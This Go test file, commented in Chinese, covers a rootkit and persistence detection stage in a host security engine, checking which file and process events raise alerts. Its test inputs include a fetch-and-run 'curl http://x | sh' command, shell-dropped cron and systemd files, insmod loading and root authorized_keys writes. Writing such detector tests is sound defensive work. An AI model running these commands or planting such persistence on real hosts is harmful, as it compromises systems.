package engine

import (
	"context"
	"encoding/json"
	"testing"

	"go.uber.org/zap"
)

// Stage 必须把执行体透传给 detector。
//
// detector 靠 exe 排除包管理器写 systemd 单元这类常规行为。Stage 不传的话，
// 排除逻辑在真实链路里完全不生效——detector 的单测会过，线上照样每次装包报警。
// 这正是「只测 detector 不测 Stage」会漏掉的那一层。
func TestRootkitStage_PassesExeToDetector(t *testing.T) {
	st := NewRootkitStage(nil, zap.NewNop())

	mk := func(fields map[string]string) PipelineEvent {
		b, _ := json.Marshal(fields)
		return PipelineEvent{HostID: "h1", DataType: 3001, Payload: b}
	}

	// 包管理器写 systemd 单元：常规行为，不该告警
	alerts, err := st.Process(context.Background(), mk(map[string]string{
		"file_path": "/etc/systemd/system/node-exporter.service",
		"exe":       "/usr/bin/dpkg",
	}))
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if len(alerts) != 0 {
		t.Fatalf("包管理器装包不该报持久化后门，实际产生 %d 条告警——"+
			"说明 exe 没有透传到 detector", len(alerts))
	}

	// 同一路径但执行体是 shell：应当告警
	alerts, err = st.Process(context.Background(), mk(map[string]string{
		"file_path": "/etc/systemd/system/evil.service",
		"exe":       "/bin/bash",
	}))
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if len(alerts) == 0 {
		t.Fatal("shell 投放 systemd 单元应当告警，实际未命中")
	}
}

// 无关事件不产生告警，也不报错。
func TestRootkitStage_IgnoresUnrelatedEvents(t *testing.T) {
	st := NewRootkitStage(nil, zap.NewNop())
	b, _ := json.Marshal(map[string]string{"exe": "/usr/bin/ls", "cmdline": "ls -la"})
	alerts, err := st.Process(context.Background(),
		PipelineEvent{HostID: "h1", DataType: 3000, Payload: b})
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if len(alerts) != 0 {
		t.Fatalf("普通命令不该告警，实际 %d 条", len(alerts))
	}
}

// 只落了 cron / systemd 文件的命中单独成一条 high 规则，不与 rootkit 指标共用 critical。
//
// 共用一条的话，一台主机上先有一条开着的持久化告警，之后真出现内核模块命中
// 只会并进那一条、级别也不再变。
func TestRootkitStage_SplitsPersistenceFromRootkit(t *testing.T) {
	st := NewRootkitStage(nil, zap.NewNop())
	mk := func(fields map[string]string) PipelineEvent {
		b, _ := json.Marshal(fields)
		return PipelineEvent{HostID: "h1", DataType: 3001, Payload: b}
	}
	cases := []struct {
		name         string
		fields       map[string]string
		wantRule     string
		wantSeverity string
	}{
		{"systemd 单元落地", map[string]string{"file_path": "/etc/systemd/system/x.service", "exe": "/bin/bash"}, PersistenceFileDropRuleID, "high"},
		{"cron 文件落地", map[string]string{"file_path": "/etc/cron.d/x", "exe": "/bin/bash"}, PersistenceFileDropRuleID, "high"},
		{"加载内核模块", map[string]string{"cmdline": "insmod /tmp/x.ko", "exe": "/sbin/insmod"}, "ROOTKIT_BACKDOOR", "critical"},
		{"root 授权密钥", map[string]string{"file_path": "/root/.ssh/authorized_keys", "exe": "/bin/bash"}, "ROOTKIT_BACKDOOR", "critical"},
	}
	for _, c := range cases {
		alerts, err := st.Process(context.Background(), mk(c.fields))
		if err != nil || len(alerts) != 1 {
			t.Fatalf("%s：应产生 1 条告警，得 %d 条 err=%v", c.name, len(alerts), err)
		}
		if alerts[0].RuleID != c.wantRule || alerts[0].Severity != c.wantSeverity {
			t.Errorf("%s：得 %s/%s，期望 %s/%s", c.name, alerts[0].RuleID, alerts[0].Severity, c.wantRule, c.wantSeverity)
		}
	}
}

// 文件事件带着发起进程的命令行时，仍按被改的路径判断。
//
// 文件事件的 exe / cmdline 是事后按进程号补上的。Stage 若先看 cmdline，
// 文件事件会被当成进程事件：cron / systemd 的落地检测只认文件来源，就此失效。
func TestRootkitStage_FileEventWithCmdlineStillUsesPath(t *testing.T) {
	st := NewRootkitStage(nil, zap.NewNop())
	b, _ := json.Marshal(map[string]string{
		"event_type": "file_open",
		"file_path":  "/etc/cron.d/backdoor",
		"exe":        "/usr/bin/bash",
		"cmdline":    "bash -c curl http://x | sh",
	})
	alerts, err := st.Process(context.Background(), PipelineEvent{HostID: "h1", DataType: 3001, Payload: b})
	if err != nil || len(alerts) != 1 || alerts[0].RuleID != PersistenceFileDropRuleID {
		t.Fatalf("应按文件路径报持久化落地，得 %+v err=%v", alerts, err)
	}

	// 进程事件里只是检查 ld.so.preload 是否存在：不告警。
	b, _ = json.Marshal(map[string]string{
		"event_type": "process_exec", "exe": "/usr/bin/sudo", "cmdline": "sudo -n test -f /etc/ld.so.preload",
	})
	alerts, err = st.Process(context.Background(), PipelineEvent{HostID: "h1", DataType: 3000, Payload: b})
	if err != nil || len(alerts) != 0 {
		t.Fatalf("只读检查不该告警，得 %+v err=%v", alerts, err)
	}
}
